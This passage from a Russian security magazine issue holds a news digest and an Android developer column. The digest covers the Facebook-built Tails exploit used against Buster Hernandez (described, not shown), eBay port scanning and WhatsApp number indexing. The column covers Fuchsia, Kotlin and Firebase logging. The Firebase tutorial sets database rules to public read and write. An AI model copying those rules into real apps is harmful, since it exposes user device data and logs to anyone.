  используя для этого чаты, электронную почту и Facebook. Он вымогал у своих
  жертв откровенные фотографии и видео, а также угрожал убить и изнасило‐
   вать их. Хуже того, нередко он присылал сво им жертвам красочные и вполне
  конкретные  угрозы,  обещая  устроить  стрель бу  и  взры вы  в  школах
  для девочек, если ему не пришлют фото и видео сексуального характера.
     Этого человека зовут Бастер Эрнандес (Buster Hernandez), а в сети он был
  известен под ником Brian Kil. Сейчас личность Эрнандеса уже известна, но до
   этого он представлял такую угрозу и так искусно скрывал свои данные, что
  руководство Facebook пошло на беспрецедентный шаг и помогло ФБР взло‐
  мать его и собрать доказа тельства, которые в итоге привели к аресту и осуж‐
  дению.
     Согласно собственным источникам журналис тов, это был первый и единс‐
   твенный раз в истории, ког да Facebook помога ла правоохранительным орга‐
  нам взломать конкретного человека.
    В Facebook Эрнандеса искренне считали худшим преступником, ког‐
  да‐либо использовавшим платформу, о чем Vice Motherboard рассказали
  сразу несколько бывших сотрудников социальной сети. По их словам, Face‐
  book даже назначила специального сот рудника, который сле дил за всеми
  действиями Эрнандеса около двух лет и раз работал новую систему машин‐
  ного обучения. Она должна была выявлять поль зователей, которые создают
  новые учетные записи и общаются с детьми, пытаясь их эксплуатировать. Эта
  система помогла обнаружить Эрнандеса, выявить другие его псевдонимы,
  а также найти его жертв.
     Кроме того, к «охоте» на Эрнандеса были привлечены сразу несколько
  офисов ФБР. В какой‐то момент Бюро предпри няло попытку взломать
  и деанонимизировать его самос тоятельно, однако потерпело неудачу, так
   как используемый ими инстру мент для взло ма не был приспособ лен против
    Tails. По информации журналис тов, Эрнандес заметил эту попытку взлома
  и потом глумился над ФБР.
    В итоге коман да безопасности Facebook, которую тогда возглавлял Алекс
  Стамос, пришла к выводу, что они могут сделать больше и что ФБР нужна их
  помощь, чтобы разоб лачить Brian Kil. Тогда Facebook наняла консалтинговую
  ИБ‐фирму для разработки хакерского инс трумента, потратив на это шес‐
   тизначную сумму.
     Для работы Эрнандес использовал защищенную операционную систему
    Tails. Это ОС семейства Debian Linux, основанная на серьезных принципах
  защиты данных. Справедливости ради нуж но сказать, что широко используют
   Tails не только преступники, но и журналис ты, акти вис ты, правозащитники
  и диссиденты, которые опасаются слежки полиции и правительств.
    Источники издания опи сывают созданный для взлома инструмент как экс‐
  плоит для уязвимости нулево го дня. Сторонняя фирма работала с инженера‐
  ми Facebook, и совместно они соз дали программу, которая эксплуатировала
   баг в видеопле ере Tails. Уяз вимость позволяла выявить реальный IP‐адрес
  человека, просматривающего специально созданное видео. Затем, по сло‐
  вам трех нынешних и бывших сотрудни ков, Facebook передала этот эксплоит
  посреднику, который уже доставил инструмент ФБР.
     После этого ФБР получило ордер и заручилось поддержкой одной
  из жертв, которая и отправила вредоносное видео Эрнандесу. В результате
   в феврале текущего года мужчина признал себя виновным по 41 статье обви‐
   нения, в том числе в производс тве детской порнографии, принуждении и сов‐
  ращении несовершеннолетних, угрозах убийством, похище нием и при чине‐
  нием вреда. В настоящее время Бас тер Эрнандес ожидает вынесения при‐
  говора и, вероятно, проведет оста ток жизни в тюрьме.


                                        Продолжение статьи →
← Начало статьи





             Одна из жертв передает вредоносное видео Эрнандесу

  Разработчики Tails сооб щили изда нию, что ничего не знали об истории Бас‐
  тера Эрнандеса и не представляют,  какая  уязвимость использовалась
  для его деанонимизации. Пресс‐служба Tails назвала эту информацию новой
   и, возможно, конфиденциальной, а также завери ла, что эксплоит никогда
  не предоставлялся на суд команды раз работки  Tails (та о нем попросту
  не знала).
    В целом этот ранее неиз вестный общественности слу чай сотрудничества
  между социальной сетью и ФБР не только подчеркивает техничес кие воз‐
  можности Facebook (а также сторонней компании, привлеченной к делу)
  и правоохранительных орга нов, но и ставит сложные этичес кие вопросы.
  К примеру, уместно ли для частных компаний оказывать помощь во взломе
  собственных пользователей.
    Почитать подробнее об этом из ряда вон выходящем случае можно в на‐
  шем материале.


  COVID, ФИШИНГ И ШИФРОВАЛЬЩИКИ
   Эксперты компании  Positive  Technologies проанализировали кибератаки в первом  квар‐
   тале 2020 года и выяснили, что число инцидентов значительно выросло по сравнению с пре‐
   дыдущим кварталом и около 13% фишин говых атак были связаны с темой COVID‐19.

   Чуть менее половины фишинговых рассылок, связан ных с COVID‐19 (44%), пришлись на час‐
   тных лиц, а каждая 5-я рассылка была нап равлена на государственные организации.

   Эпидемией пользовались как для массовых вредонос ных кам паний,  так и для сложных
   целенаправленных атак (APT‐атак). Под видом официальных данных о статис тике заражений,
   мерах профилактики и вакцине, рассылаемых якобы от имени государственных органов
   и медицинских учреждений, в первом квартале распространялась мал варь Emotet, Remcos,
   AZORult, Agent Tesla, LokiBot, TrickBot и другие.

   Рассылки писем с вредоносными вложениями на тему эпидемии про водили группы TA505,
  Hades, Mustang Panda, APT36, SongXY, а также южнокорейская группировка Higaisa.

  В первом квартале 2020 года было выявлено на 22,5% больше кибератак, чем в четвертом
   квартале 2019 года.





                                 Мотивы хакеров

  В общей сложности в течение квар тала высокую активность проявляли 23 APT-группировки,
   атаки которых были нап равлены преимущес твен но на госучреждения, промышленные
  предприятия, фи нансовую отрасль и медицинские организации.





                                      Объ екты атак


   По сравнению с последним кварталом прошлого года сущес твенно вырос ла и доля атак
   на госучреждения с использованием мал вари (81% против 66%) и методов соци альной инже‐
   нерии (79% против 66%).





 СЛЕЖКА
 ЧЕРЕЗ ПОРТЫ
  В конце мая 2020 года ИБ‐эксперты и журналис ты Bleeping Computer обна‐
  ружили, что сайт ebay.com сканирует локальные порты посетителей в поисках
  приложений для удаленной поддержки и удаленного доступа. Многие из этих
  портов связаны с такими инс трументами, как Windows Remote Desktop, VNC,
   TeamViewer, Ammyy Admin. Сканирование выпол няется при помощи скрипта
   check.js.
     ИБ‐специалист Дэн Немек пос вятил этой странной активности eBay целую
   статью, где постарался разоб рать ся в происходящем. Так, Немек сумел
  проследить используемый аукционом скрипт до продукта ThreatMetrix, соз‐
  данного компанией LexisNexis и предназна ченного выявлять мошенников.
   Хотя сканер eBay, по сути, ищет извес тные и легитимные программы для уда‐
  ленного дос тупа и администрирования, в прошлом некоторые из них дей‐
   ствительно использовались в качестве RAT в фишинговых кампаниях.
     То есть сканирование, очевидно, про водится, чтобы обнаружить скомпро‐
  метированные  компьютеры,  которые  исполь зуются  для мошенничества
  на eBay. К примеру, еще в 2016 году зло умышленники с помощью TeamViewer
   захватывали чужие машины, опустошали счета PayPal и заказы вали товары
  с eBay и Amazon.
     Сканирование выпол няется с использованием WebSockets для подклю‐
  чения к 127.0.0.1. Все 14 сканируемых портов и связанные с ними программы
  перечислены в таблице ниже. Журналис ты Bleeping Computer так и не смогли
  определить программу на порте 63333. Осно выва ясь на идентификаторе
   REF, они предполагают, что это контроль ный порт для тестов.





  Чтобы узнать, какие еще сайты могут исполь зовать этот скрипт, Bleeping
  Computer обратился за помощью к специалистам ИБ‐компании DomainTools.
  Дело в том, что сайты загружа ют защитные скрипты ThreatMetrix с помощью
  пользовательско го хоста на  online‐metrix.net. Например, eBay загружает
   скрипт ThreatMetrix с src.ebay‐us.com, это CNAME DNS для h‐ebay.online‐
   metrix.net.
    Компания DomainTools помогла изданию составить список из 387 ана‐
   логичных уникальных хостов на online‐metrix.net. Используя этот список, жур‐
  налисты посетили сайты многих крупных компаний и проверили, сканируют ли
  они компьютеры своих посетителей.
     Хотя ни один сайт из полученного списка не дотягивает до eBay по раз‐
  мерам, многие из ресурсов принадлежат широко известным брендам. В час‐
  тности, оказалось, что компьютеры пользователей ска нируют скрипты на сай‐
   тах Citibank, TD Bank, Ameriprise, Chick‐ﬁl‐A, LendUp, Beachbody, Equifax IQ
   Connect, TIAA‐CREF, Sky, Gumtree и WePay.
    Интересно, что сканирование портов каждый раз выполнялось по‐раз‐
   ному, в зависимости конкретного от сайта. Например, Citibank, Ameriprise
  и TIAA‐CREF сканируют компьютеры сразу же, при посещении главной стра‐
  ницы сайта. Тогда как TD Bank, Chick‐ﬁl‐A, LendUp, Equifax IQ Connect, Sky,
  Gumtree и WePay сканируют только порты тех посети телей, которые пытались
  войти в систему. В свою очередь, BeachBody.com сканирует порты только
  при оформлении заказа.
    На основании полученного списка доменов были выявлены и другие
  известные компании, которые используют скрипт ThreatMetrix. Это: Netﬂix, Tar‐
   get, Walmart, ESPN, Lloyd Bank, HSN, Telecharge, Ticketmaster, TripAdvisor,
   PaySafeCard и, вероятно, даже Microsoft. Исследователям не удалось акти‐
  вировать функцию сканирования портов на этих сай тах, но она может исполь‐
   зоваться на страницах, куда эксперты поп росту не доб рались.
    Журналисты протестирова ли нес колько способов избавиться от такого
  наблюдения. Оказалось, что блокировщик рекламы uBlock Origin в браузере
   Firefox оказался способен заблокировать работу скрипта ThreatMetrix. Увы,
  но во время других тестов uBlock Origin не смог блокировать сканирование
  ни в новом Microsoft Edge, ни в Google Chrome.
    Но позже многие  читатели издания отметили,  что  у  uBlock  Origin
  для Chrome все же получилось заблокировать сканирование портов на eBay,
  и тогда журналисты связались с разработчиком блокировщика Раймондом
  Хиллом и спросили, не вно сил ли тот какие‐то изменения в код своего про‐
   дукта. Создатель uBlock Origin ответил, что ничего не менялось, и пред‐
  положил, что сайты могли сами отказаться от исполь зования ThreatMetrix.
     Хилл также рекомендовал журналистам использовать логи uBlock Origin,
   чтобы обнаружить правила, блокирующие скрипт для сканирования портов.
  Таким образом удалось понять, что изначально eBay сканировал порты
  посетителей при посещении домашней страницы и прочих страниц сайта,
  но теперь аукцион перенес функцию сканирования портов на страницы офор‐
  мления заказа.
     Посмотрев логи после посещения страницы оформле ния заказа, иссле‐
  дователи увидели, что список фильтров EasyPrivacy блокирует скрипт‐сканер,
  расположенный по адресу src.ebay‐us.com/fp/check.js.
     Последующее изучение коммитов для списка EasyPrivacy помогло понять,
   что скрипт для сканирования портов на eBay блокирует недавно добавленное
  правило.





  Как показало изучение других сайтов, скрипт для ска нирования портов бло‐
  кировался фильтром, предназна ченным для скрипта  /fp/tags.js?, который
  использовался для запус ка скрипта‐сканера.





  Оказалось, что в итоге, бла года ря новому фильтру, EasyPrivacy эффективно
  блокирует сканирование портов на eBay, Ameriprise, Citi, TD Bank, LendUp,
  Beachbody, Equifax IQ Connect и Sky. К сожалению, правил для TIAA.org, Chick‐
   ﬁl‐A, Gumtree и WePay пока нет, и эти сайты по‐прежнему изу чают порты
  посетителей, даже если те используют рас ширение uBlock Origin.


 ЛИЧНЫЕ ГАДЖЕТЫ НА РАБОТЕ
   Согласно исследованию «Лаборатории Кас перско го», 85% сотрудников рос сийских компаний,
   чей штат не превышает 50 человек, исполь зуют для удаленной работы в период пандемии лич‐
   ные устройства.

  19% работников начали применять собствен ные устройства в бизнес‐целях пос ле перехода
   на дистанционный режим работы, но 54% отметили, что делали это и раньше.

   Исследователи уверены, что в сложившихся обстоятель ствах компаниям сле дует повышать
   цифровую грамотность сотрудников и напоминать о таких базовых тре бованиях информацион‐
   ной безопасности, как наличие защитного решения на рабочем устройстве, использование
   надежных и уникальных паролей, регулярное обновление прог рамм. Но подобные инс трукции
   получали лишь 8% сотрудников малых организа ций.





 НОМЕРА WHATSAPP
 В GOOGLE
  ИБ‐специалист Атул Джа ярам обра тил внимание, что один из доменов What‐
  sApp (wa.me) сливает телефонные номера поль зователей, поз воляя Google
   их индексировать.
    Домен  wa.me  действительно  принадлежит  мессенджеру  WhatsApp
  и используется для размещения специальных ссылок типа click to chat, после
  нажатия на которые можно начать чат с кем‐то, чьего номера телефона нет
   в контактах.
    Иссле дователь объясня ет, что  у доменов wa.me и api.whatsapp.com
   отсутствует файл robots.txt, который говорил бы поис ковым системам, что
  не нужно сканировать телефонные номера на сайте. В результате ссылки,
  начинающиеся с https://wa.me/, индекси руют ся Google и другими поис‐
  ковыми системами и появляют ся в результатах поиска. При нажатии такие
  ссылки перенап равляют человека на api.whatsapp.com, где он может продол‐
  жить чат с пользователем WhatsApp.





        «По мере того как телефонные номера „уте кают“, злоумыш ленник
        может отправ лять на них сообщения, звонить, продать эти телефон-
        ные номера мар кетологам, спа мерам и мошенникам», — рас ска зыва ет
       Джа ярам.

  Издание Bleeping Computer, журналис тов которого заинтересовала данная
  проблема, отмечает,  что обнаруженная исследователем странность —
   это вовсе не обязатель но ошибка. Для тес та журналис ты создали фейковую
  ссылку http://wa.me/11111, используя поддельный номер телефона. Как можно
  видеть на иллюстрации ниже, эта ссыл ка перенаправляет на api.whatsapp.‐
  com/send?phone=11111 и в ито ге приводит на ту же самую целевую страницу,
  создавая впе чатление, будто номер является активным WhatsApp‐контактом,
  даже если это не так.
     То есть спамеры не могут просто использовать эту функцию для перебора
  настоящих номеров WhatsApp. Воз можно, именно по этой причине Facebook
   отклонила запрос исследователя на получение вознаграждения по прог‐
  рамме bug bounty.
     Также журналисты отмечают, что в сети давно дос тупны целые каталоги
  телефонных номеров, чьи владельцы никогда не имели учетных записей
   в WhatsApp и других мессенджерах, а Google никогда их не индексировал.
     Тем не менее Джаярам по‐прежнему убеж ден, что такая утечка телефон‐
  ных номеров может представлять угрозу безопасности и конфиденциальнос‐
   ти пользователей мес сенджера. Он рекомендует инженерам WhatsApp
  использовать файл  robots.txt для своих доменов, не позволяя Google
  индексировать номера телефо нов.



         «К сожале нию, они еще не сде лали этого, и ваша конфиденциаль-
         ность может быть пос тавле на на кар ту. Сегод ня ваш номер мобиль-
         ного телефона связан с вашими Bitcoin-кошельками, Aadhaar, банков-
         ски ми сче тами, UPI, кре дитными кар тами… Еще одна воз можность
         для злоумыш ленника, который зна ет ваш номер телефона, — это ата-
         ки по обме ну и клонированию SIM-кар ты», — говорит иссле дова тель.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА
   Хакеры выдали свой сайт за один из доменов японской крип товалютной биржи Coincheck


   На хакерских форумах растет спрос на учетные данные от YouTube‐каналов


   Опубликован RCE‐эксплоит для проблемы SMBGhost


   Операторы шифровальщиков Maze, LockBit и Ragnar Locker объединили усилия


   Исследователи показали, как можно под слушивать разговоры через обычную лампочку


  Южноафриканский банк перевыпускает 12 мил лионов карт, так как сотрудник украл мас‐
   тер‐ключ


   Сотрудники eBay при сыла ли похоронные вен ки и окровавленные маски недовольным блогерам


    Mozilla запустит собственный VPN‐сервис в ближайшие недели


   Blu‐ray‐плееры Samsung ушли в бесконечную перезагрузку, и никто не знает почему


   Zoom пересмотрела свое решение: сквоз ное шифрование будет доступно всем
HEADER
ANDROID

АРХИТЕКТУРА FUCHSIA
И ТЯЖЕЛОВЕСНЫЕ
ВЫЧИСЛЕНИЯ
В UI‐ПОТОКЕ





В этом выпус ке: погружение в архитектуру
и безопас ность ОС Fuchsia, несколько спо‐
собов исполь зовать Kotlin в качестве скрип‐
тового языка, неожиданный спо соб запус‐
тить тяжеловес ные вычисления в основном          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
потоке приложения, читшит по коллекциям              zobnin@glc.ru
Kotlin, советы по работе с отладчиком, спо‐
соб быстрого заполнения полей data‐клас‐
сов и способ хранения логов на уда лен ном
сервере  без  необходимости  поднимать
сервер. А  также свежая подборка биб‐
лиотек для разработчиков.


                ПОЧИТАТЬ


Fuchsia: архитектура и безопасность
Playing Around With The Fuchsia Operating System — исследование безопас‐
ности операционной сис темы Fuchsia, которая, по слухам, должна прийти
на смену Android. Исследова тели нашли в ОС несколько стандартных багов,
которые тем не менее не дают каких‐либо полномочий в системе в силу
самой архитектуры ОС. И именно описание архитектуры — наиболее инте‐
ресная часть статьи.
   Fuchsia — это мик роядерная операционная система на базе ядра Zircon,
написанного на языке C++. Все остальные компоненты ОС, обычно реали‐
зованные внутри ядра, вынесены в сервисы пространс тва пользователя
и общаются между собой с помощью независимого от язы ка механизма IPC.
Часть этих компонентов, как и само ядро, реализована на язы ке C++ (драй‐
веры USB, например), другая часть — на дру гих языках. Например, TCP/IP‐
стек написан на языке Rust, также поддерживает ся Go.





                 Микроядро и компоненты Fuchsia

В отличие от других микроядерных ОС, драйверы Fuchsia могут быть объеди‐
нены в один процесс, именуемый devhost. На рисунке ниже драйверы AHCI,
SATA, MinFS и BlobFS объединены в Devhost Proccess 3.





                       Devhost‐про цес сы Fuchsia

Такая архитектура позволяет сократить количество переключений контекста
и сделать ОС более эффективной. С другой стороны, надежность компонен‐
тов снижается, но не катас трофичес ки — devhost‐процессы обычно объ еди‐
няют в себе драйверы одного стека (в случае с Devhost Process 3 это драй‐
веры для работы с внутренним накопителем ПК), поэтому уязвимость в одном
процессе Devhost при ведет к уязвимос ти в драйверах одного стека и не
заденет другие (например, драйверы USB). Fuchsia активно использует
модуль IOMMU для защиты памяти устрой ств. Каждый процесс Devhost имеет
право обращаться только к своим адресам ввода‐вывода.
   Как и Unix, Fuchsia следует концепции «все есть файл», когда файлы могут
представ лять собой как данные на диске, так и устройства или каналы ком‐
муникации. Однако, в отличие от Unix, Fuchsia не открывает каждому процес‐
су доступ ко всей файловой иерархии, а соз дает для него собс твенное прос‐
транство имен (так же как это делает Plan 9, неудавшаяся пре емница Unix).
Так реализуется идея песочницы, когда каждое приложение имеет доступ
только к ограниченному набору ресурсов.
  На самом низком уровне (уровне микроядра Zircon) все файлы представ‐
лены хендлами (handle) — это нечто вроде токена для доступа к файловому
объекту. Каждый хендл должен иметь свой вид (kind) и права, которые контро‐
лируют доступ к системным вызовам.
  В репозитории Fuchsia все компоненты имеют unit‐тесты и фуззеры. Код
собирается с активированными технологиями защиты: ASLR, DEP, SafeStack,
ShadowCallStack и AutoVarInit. Для кода на C++ дополнительно повышают
надежность. Например, часто используется версия оператора [] с провер‐
ками границ массива.


              РАЗРАБОТЧИКУ


Kotlin в качестве скриптового языка
May 2020: The state of Kotlin Scripting — статья об использовании Kotlin
в качестве скриптового языка.
  Существует два способа запустить код Kotlin как скрипт: kscript, успевший
стать стандартным методом, и запуск с помощью самого компилятора Kotlin
(который тоже может работать в качестве интерпретатора).
  В первом случае скрипт для macOS/Linux будет выглядеть так:


#!/usr/bin/env kscript
println("my args are ${args.joinToString(", ")}")

Во втором — так:


#!/usr/bin/env kotlin
println("my args are ${args.joinToString(", ")}")

Первый способ предлагает наибольшую функци ональ ность, в том числе:
 • кеширование байт‐кода для ускорения пос ледующих запусков того же
   скрипта;
 • возможность подклю чать зависимос ти Maven:


   @file:DependsOn("com.squareup.okhttp3:okhttp:4.7.2")

 • возможность автоматичес кой установки kscript при запуске скрипта.

Второй способ менее функциона лен, но в данный момент поддерживается
командой Kotlin в первую очередь. Кро ме того, такие скрипты можно редак‐
тировать в IDEA напрямую, без необходимос ти соз давать проект. Примеры
скриптов: kscript, Kotlin.


Тяжеловесные вычисления в основном потоке
How to run an expensive calculation with Kotlin Coroutines on the Android Main
Thread without freezing the UI — статья о том, как запустить вычисления
в основном потоке приложения и при этом не создать проблем с отрисовкой
интерфейса.
  Все знают, что Android выполняет операции отрисовки графичес кого
интерфейса в основном потоке приложения. Поэтому, чтобы не получить
фризы, необходимо выносить все тяжеловесные вычисления в фоновый
поток. Это золотой стандарт раз работки для Android. Но, как ни странно, его
можно обойти.
   Вот стандартный пример выноса вычислений в фоновый поток с помощью
короутин:


private suspend fun calculateFactorialOnDefaultDispatcher(number: Int
): BigInteger =
    withContext(Dispatchers.Default) {
        var factorial = BigInteger.ONE
        for (i in 1..number) {
            factorial = factorial.multiply(BigInteger.valueOf(i.
toLong()))
        }
        factorial
    }

Если вынести код этого метода из блока withContext(), он закономерно
подвесит интерфейс на нес колько секунд. Но! Если при этом добавить в код
вызов функции yield(), интерфейс никак не постра дает и останется плав‐
ным:


private suspend fun calculateFactorialInMainThreadUsingYield(number:
Int): BigInteger {
    var factorial = BigInteger.ONE
    for (i in 1..number) {
        yield()
        factorial = factorial.multiply(BigInteger.valueOf(i.toLong())
)
    }
    return factorial
}

Как это возможно? Все дело в том, как Android вызывает код отрисовки
интерфейса в основном потоке приложения. Каждые 16 миллисекунд (при
частоте обновления экра на в 60 герц) фрей мворк Android добавляет новый
Runnable (по сути, блок кода) с кодом обновления интерфейса в очередь
исполнения (MessageQueue) основного потока при ложения. Если основной
поток не занят в это время дру гой работой, он исполнит этот код. В против‐
ном случае продол жится исполнение текущего кода, а операция обновле ния
будет пропущена. Так происходит про пуск кадра, а пропуск нескольких кад‐
ров подряд выглядит как фриз интерфейса.
  Именно это дол жно было случиться при запус ке предыду щего кода. Но не
случилось благодаря вызову функции yield(). Эта функция приостанавлива‐
ет исполнение текущей короутины до получения следующего эле мента (в
данном случае числа). Приостановка короутины, в свою очередь, приводит
к перемещению кода обработки следующего элемента в MessageQueue.
В итоге весь код вычисления факториала разбива ется на множество малень‐
ких блоков, которые помещаются в очередь исполнения вперемешку с кодом
обновления экрана. Поток успевает выполнить несколько шагов вычисления
факториала, затем код обновления UI, затем еще несколько шагов фактори‐
ала и так далее.





  Очередь исполнения основно го потока приложения при использовании
   yield

Это канонический пример того, что называ ют сло вом concurrency в противо‐
вес параллельному вычислению. Мы по максимуму загружаем основной
поток работой, при этом позволяя ему быстро переключаться между задача‐
ми. Факториал при таком подходе вычисляется при мерно в два раза мед‐
леннее, зато интерфейс оста ется плавным даже без использования фоновых
потоков.


Читшит по коллекциям Kotlin
Kotlin Collection Functions Cheat Sheet — боль шая шпаргалка по функциям
Kotlin для работы с кол лекциями. Наиболее интересные моменты:
 • Кроме стандартных списков, хеш мапов и сетов, в Kotlin также есть такие
   типы коллекций, как linkedMap, linkedSet, sortedMap и sortedSet. По сути,
   это аналоги тех же сетов и хешмапов, но с функци ями сохранения пос‐
   ледовательности элементов  (linked) или автоматической сортировкой
   (sorted).
 • Кроме функций для соз дания коллекций, в языке также есть ряд функций
   для их копирования. Например, кро ме стандартного метода copyOf, так‐
  же доступны методы copyInto — скопировать все элементы в другой
  массив, copyOfRange — ско пиро вать диапа зон элементов и toCollec
  tion — скопировать все элементы в дру гую коллекцию.
 • При присвоении кол лекций можно использовать методы для возврата
  дефолтных значений: ifEmpty — вернуть дефол тное значение, если кол‐
   лекция пуста; orEmpty — вернуть пус тую кол лекцию, если текущая кол‐
   лекция равна null; requireNoNulls — выб расывает исключение Ille
  galArgumentException , если все элементы кол лекции равны  null;
  listOfNotNull — исклю чение, если хотя бы один из элементов равен
    null.
 • Функции toIntArray и asIntArray (а также все остальные функции
   с аналогичными именами) различа ются тем, что первая соз дает список
   с новыми эле ментами на основе ори гинального списка, а вторая создает
   список элементов — ссылок на элементы ори гинального списка.
 • Запись map.toList() эквивалентна записи map.entries.map { it.
  toPair() } .
 • Чтобы обратиться к элементам списка (List) по индексам, можно исполь‐
   зовать функцию withIndex.
 • Большая часть функций — модификато ров списков имеет эквивалент,
   не изменяющий список. Например, у функции add, добавляющей элемент
   в список, есть эквивалентная функция plus, которая возвращает новый
   список с добавленным элементом. Другие при меры: removeFirst —
  drop, removeLast — dropLast.
 • Kotlin позволяет объединять коллекции нес коль кими способами. Нап‐
   ример, union создает новую коллекцию, в которой присутству ют только
   уникальные элементы двух коллекций, intersect — новая кол лекция
   с элементами, которые присутству ют в обеих коллекциях, substract —
   коллекция элементов, присутс твующих только в первом списке. Функция
  zip возвращает кол лекцию, каждый элемент которой включает элементы
   из первой и вто рой коллекции с одинако вым индексом.
 • Кроме всем известного метода map, предназна ченного для преобразова‐
   ния коллекции элементов одно го типа в кол лекцию элементов дру гого
   типа, существуют и дру гие функции: aggregate — объ еди нение нес коль‐
   ких элементов, associate — связыва ние элемента с каким‐либо зна‐
   чением, groupBy — группировка элемен тов, flatten — преобразование
  многомерных кол лекций в одномерные, chunked — раз бивка по катего‐
   риям.





                 Спо собы объединения коллекций


Советы по работе с отладчиком
Debugging in Android Studio — подборка спо собов сделать работу с отладчи‐
ком проще. Наиболее интересные советы:
 • Android Studio позволяет уста новить так называемый условный брейк‐пой‐
   нт. Он сработает толь ко в том случае, если ука занное в нем условие будет
   верным  (например,  переменная  равна  определенному  значению).
   Добавить такое усло вие можно с помощью контекстного меню по правой
   кнопке мыши.
 • Кроме условных брейк‐пойнтов, существу ют также зависи мые брейк‐пой‐
   нты. Они срабатывают только в том случае, если сработает другой
   брейк‐пойнт. Чтобы добавить такую зависимость, сле дует выбрать More
   в контекстном меню брейк‐пойнта, затем выб рать брейк‐пойнт, от которо‐
   го будет зависеть текущий брейк‐пойнт, в контекстном меню Disable until
   breakpoint is hit.
 • По умолчанию брейк‐пойнт заморажива ет все потоки приложе ния. Изме‐
   нить такое поведение мож но с помощью контекс тного меню — Supsend:
   thread.
 • Брейк‐пойнты можно использовать не только для остановки приложения.
   Android  Studio  поз воляет  сделать   так,  чтобы  вместо  остановки
   брейк‐пойнт выводил в лог отладочную информацию (по аналогии с фун‐
   кциями логирования Android). Для этого нажима ем в контекс тном меню
   брейк‐пойнта More и в открывшемся окне настроек отключаем опцию Sus‐
   pend и включаем опцию Evaluate and  log. В поле ввода указываем
  переменную, значение которой нужно вывести на экран.
 • Отладчик позволя ет прос ледить жизненный цикл любого выб ранного объ‐
   екта независимо от того, в каком месте кода ты в данный момент
   находишься. Для это го необходимо пос тавить на выбранный объект
   отметку: Mark Object в контекс тном меню объекта в окне Variables. После
   этого он будет добавлен на вкладку Watches.
 • Другой способ проследить объект — это исполь зовать кнопку Evaluate Ex‐
   pression в панели отладчика. Прос то напечатай имя объ екта, и окно
   результата позволит тебе исследовать этот объект.





               Функция Evaluate Expression в действии


Хранение логов в Firebase
Remote logging with Timber and Firebase Realtime Database — статья о том,
как хранить логи приложения на удален ном сервере без необ ходимости под‐
нимать собственный сервер.
   Автору было нужно каким‐то образом получать логи от пользователей,
при том что среднеста тистический пользователь в принципе не знает,
как снять логи, а включать логирование в релизных сборках — не самая луч‐
шая идея. Выход нашелся в использовании облачной Firebase Realtime Data‐
base и библиотеки логирования Timber.
  Для начала надо подключить библиотеку Firebase к приложению, а затем
зарегистрироваться и создать проект в Firebase Console. Об этом написано
множество туториалов.
  С помощью консоли Firebase нужно соз дать новую базу данных и добавить
правила доступа:


{
  "rules": {
    ".read": true,
    ".write": true
  }
}

Далее к проекту сле дует подключить биб лиотеку Timber:


implementation 'com.jakewharton.timber:timber:4.7.1'

Также понадобится data‐класс для хра нения записей логов:


data class RemoteLog(
    var priority: String,
    var tag: String?,
    var message: String,
    var throwable: String?,
    val time : String
)

И класс для хранения информа ции об устройстве:


data class DeviceDetails(
    val deviceId: String,
    val osVersion: String = Build.VERSION.RELEASE,
    val manufacturer: String = Build.MANUFACTURER,
    val brand: String = Build.BRAND,
    val device: String = Build.DEVICE,
    val model: String = Build.MODEL,
    val appVersionName: String = BuildConfig.VERSION_NAME,
    val appVersionCode: Int = BuildConfig.VERSION_CODE
)

Для создания записей на основе этого класса вос пользуемся следующим
деревом Timber (в терминологии Timber это сво его рода хендлер, обработчик
записываемых в лог сооб щений):


class TimberRemoteTree(private val deviceDetails: DeviceDetails) :
Timber.DebugTree() {
    private val dateFormat = SimpleDateFormat("dd‐MM‐yyyy", Locale.
getDefault())
    private val timeFormat = SimpleDateFormat("yyyy‐MM‐dd hh:mm:ss.
SSS a zzz", Locale.getDefault())
    private val date = dateFormat.format(Date(System.
currentTimeMillis()))
    private val logRef = Firebase.database.getReference("logs/$date/
${deviceDetails.deviceId}")


    override fun log(priority: Int, tag: String?, message: String, t:
Throwable?) {
        if (BuildConfig.REMOTE_LOG_ENABLED) {
            val timestamp = System.currentTimeMillis()
            val time = timeFormat.format(Date(timestamp))
            val remoteLog = RemoteLog(priorityAsString(priority), tag
, message, t.toString(), time)


            with(logRef) {
                updateChildren(mapOf(Pair("‐DeviceDetails",
deviceDetails)))
                child(timestamp.toString()).setValue(remoteLog)
            }
        } else super.log(priority, tag, message, t)
    }


    private fun priorityAsString(priority: Int): String = when (
priority) {
        Log.VERBOSE ‐> "VERBOSE"
        Log.DEBUG ‐> "DEBUG"
        Log.INFO ‐> "INFO"
        Log.WARN ‐> "WARN"
        Log.ERROR ‐> "ERROR"
        Log.ASSERT ‐> "ASSERT"
        else ‐> priority.toString()
    }
}

Это все, теперь достаточно «посадить» это дерево:


if (BuildConfig.DEBUG) {
    val deviceId = Settings.Secure.getString(contentResolver,
Settings.Secure.ANDROID_ID)
    val deviceDetails = DeviceDetails(deviceId)
    val remoteTree = TimberRemoteTree(deviceDetails)
    Timber.plant(remoteTree)
} else {
     // TODO plant timber release tree.
}

Как видно, облачное сохранение логов будет акти вировано только в том слу‐
чае, если это DEBUG‐сборка приложения, а переменная BuildConfig.RE‐
MOTE_LOG_ENABLED имеет значение true.


Автозаполнение полей data-классов
My IntelliJ Plugin Collection – Kotlin Fill class — очень короткая заметка об очень
полезном плагине Intellij IDEA и Android Studio.
  Плагин называется Kotlin Fill Class и, как следует из его названия, пред‐
назначен для быстрого автоматичес кого запол нения аргументов конструк‐
торов классов.
   Очень полезен при использовании data‐клас сов с большим количеством
полей. Достаточ но навести курсор на имя класса, нажать Alt + Enter и выб рать
пункт Fill Class Constructor, и плагин автоматически вставит все име нованные
аргументы, присвоив им дефолтные зна чения.
  Плагин также работает и для функций.





                    Результат работы плагина


             ИНСТРУМЕНТЫ


 • sndcpy — утилита для переб роса звука с устройства на ПК (аналог scrcpy
   для звука).


              БИБЛИОТЕКИ


 • Meow‐Framework‐MVVM — фреймворк для быстрого создания приложе‐
   ний с архитектурой MVVM;
 • CornerSheet — view, выезжающий с края экра на;
 • Dsl‐api‐generator — плагин IDEA и Android Studio для генерации DSL;
 • Rawdrawandroid — фреймворк для создания приложений под Android
   на чистом С;
 • Niddler — инструмент отладки сетевого кода;
 • Register — инструмент отладки покупок внутри приложения;
 • State‐delegator — библиотека, упро щающая управление состояниями
   экрана;
 • Preﬁller — плагин Gradle для генерации предварительно запол ненных баз
   данных Room в момент компиляции.
COVERSTORY
  ПРАКТИКА
 РАЗБИТЫХ
   ОКОН





                                              v31_v37
